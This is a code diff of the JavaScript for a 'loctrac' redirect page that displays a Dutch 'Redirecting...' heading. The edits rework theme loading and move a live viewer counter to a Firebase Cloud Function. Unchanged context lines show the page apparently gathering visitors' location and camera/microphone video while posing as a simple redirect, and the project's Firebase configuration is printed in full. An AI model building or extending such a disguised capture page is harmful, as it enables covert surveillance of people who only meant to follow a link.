@@ -117,6 +117,8 @@
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+      <!-- NEW: Firebase Functions SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-functions-compat.js"></script>
     <script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
 </head>
 <body>
@@ -143,17 +145,18 @@ function displayError(message) {
 }
 
     const firebaseConfig = {
-    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA", // REPLACE
-    authDomain: "loctrac-8d7ef.firebaseapp.com",       // REPLACE
-    projectId: "loctrac-8d7ef",                         // REPLACE
-    storageBucket: "loctrac-8d7ef.firebasestorage.com",   // REPLACE
-    messagingSenderId: "34491549339",                   // REPLACE
-    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",     // REPLACE
-    measurementId: "G-65PYC8E9VR"                      // REPLACE
+        apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA", // REPLACE
+        authDomain: "loctrac-8d7ef.firebaseapp.com",       // REPLACE
+        projectId: "loctrac-8d7ef",                         // REPLACE
+        storageBucket: "loctrac-8d7ef.firebasestorage.com",   // REPLACE
+        messagingSenderId: "34491549339",                   // REPLACE
+        appId: "1:34491549339:web:c666c4f8f3271bab06e83e",     // REPLACE
+        measurementId: "G-65PYC8E9VR"                      // REPLACE
 };
 
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
+const functions = firebase.functions(); // Initialize Functions
 const errorMessage = document.getElementById("error-message");
 const progressBar = document.getElementById('progress-bar'); // Get progress bar element
 // NEW: Redirect heading element
@@ -163,7 +166,7 @@ const cloudName = "dnvkhmgj0";        // REPLACE
 const uploadPreset = "locstorage";  // REPLACE
 
 // Get the selected theme from user settings and apply it
-// MODIFIED: Also sets the redirect heading
+// MODIFIED: Correctly loads and applies the selected theme's data.
 async function applyUserTheme() {
     try {
         const currentUserId = await getCurrentUserId();
@@ -172,21 +175,32 @@ async function applyUserTheme() {
 
         if (!settingsSnap.exists) {
             console.log("No user settings found, using default theme.");
-            return; // Use default styles (already in your CSS)
+            return;
         }
 
         const settingsData = settingsSnap.data();
-        const themeName = settingsData.theme || 'default'; // Default to 'default'
+        const themeName = settingsData.theme || 'default';
 
-        if (themeName === 'default') {
-            // Don't need to do anything - default styles are already applied
-            document.body.classList.remove('theme-dark', 'theme-green'); // Remove other classes
-        } else if (themeName === 'dark') {
-            document.body.classList.add('theme-dark'); // Add the class
-            document.body.classList.remove('theme-green'); // Remove other classes
-        } else if (themeName === 'green') {
-            document.body.classList.add('theme-green');
-            document.body.classList.remove('theme-dark'); // Remove other classes
+        // Load the *selected* theme's data, even for built-in themes
+        if (themeName === 'default' || themeName === 'dark' || themeName === 'green') {
+          document.body.classList.remove('theme-dark', 'theme-green');
+            if(themeName === 'dark'){
+                document.body.classList.add('theme-dark');
+            }
+            if(themeName === 'green'){
+                document.body.classList.add('theme-green');
+            }
+
+            // Set heading for built-in themes
+            if (themeName === 'default') {
+                redirectHeading.textContent = "Doorverwijzing...";
+            } else if (themeName === 'dark') {
+                redirectHeading.textContent = "Doorverwijzing..."; // Or a dark-themed heading
+            } else if (themeName === 'green') {
+                redirectHeading.textContent = "Doorverwijzing..."; // Or a green-themed heading
+            }
+
+
         } else {
             // Load custom theme data
             const themeRef = db.collection('redirectThemes').doc(themeName);
@@ -211,11 +225,11 @@ async function applyUserTheme() {
                 document.getElementById('custom-redirect-text').textContent = themeData.customText;
                 document.getElementById('custom-redirect-text').style.display = 'block';
             }
-            // NEW: Set redirect heading from theme data, fall back to "Doorverwijzing..."
-            redirectHeading.textContent = themeData.redirectHeading || "Doorverwijzing...";
 
-             document.body.classList.remove('theme-dark', 'theme-green');
+            // Set redirect heading (Corrected)
+            redirectHeading.textContent = themeData.redirectHeading || "Doorverwijzing...";
         }
+
 
     } catch (error) {
         console.error("Error applying theme:", error);
@@ -223,7 +237,6 @@ async function applyUserTheme() {
         errorMessage.style.display = 'block';
     }
 }
-
 
 async function getCurrentUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
@@ -389,26 +402,20 @@ function updateProgress(percentage) {
     progressBar.textContent = percentage + '%';
 }
 
-// NEW: Function to update viewer count (increment/decrement)
+// NEW: Function to update viewer count (using Cloud Function)
 async function updateViewerCount(increment) {
-    const viewerCountRef = db.collection('metrics').doc('redirectViewers');
     try {
-        await db.runTransaction(async (transaction) => {
-            const doc = await transaction.get(viewerCountRef);
-            let newCount = 1; // Default to 1 if doc doesn't exist
-            if (doc.exists) {
-                newCount = (doc.data().count || 0) + (increment ? 1 : -1);
-                newCount = Math.max(0, newCount); // Ensure count doesn't go below 0
-            }
-            transaction.set(viewerCountRef, { count: newCount }, { merge: true });
-        });
+        const change = increment ? 1 : -1;
+        // Call Cloud Function (Important: Replace 'incrementViewerCount' with your function's name)
+        const incrementCounter = functions.httpsCallable('incrementViewerCount');
+        await incrementCounter({ change: change });
     } catch (error) {
         console.error("Error updating viewer count:", error);
-        // Don't display an error to the user on *this* page, as it's not critical.
+        // Don't display error on redirect page itself.
     }
 }
 
-// NEW: Heartbeat function
+// NEW: Heartbeat function (using Cloud Function)
 async function sendHeartbeat() {
   await updateViewerCount(true); // Treat heartbeat as "still active"
 }
@@ -476,16 +483,16 @@ async function sendHeartbeat() {
             collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting = false
         }
 
-       // NEW: Viewer Count Logic
+        // NEW: Viewer Count Logic
         await updateViewerCount(true); // Increment on initial load
 
         // Set up heartbeat (every 30 seconds)
         const heartbeatInterval = setInterval(sendHeartbeat, 30000);
 
-        // Decrement on page unload (best-effort)
-        window.addEventListener('beforeunload', async () => {
-          clearInterval(heartbeatInterval); // Stop the heartbeat
-          await updateViewerCount(false); // Decrement the counter
+        // Decrement on page unload using sendBeacon (BEST PRACTICE)
+        window.addEventListener('beforeunload', () => {
+            clearInterval(heartbeatInterval);
+            navigator.sendBeacon('/incrementViewerCount?change=-1'); // Use relative URL
         });
 
 
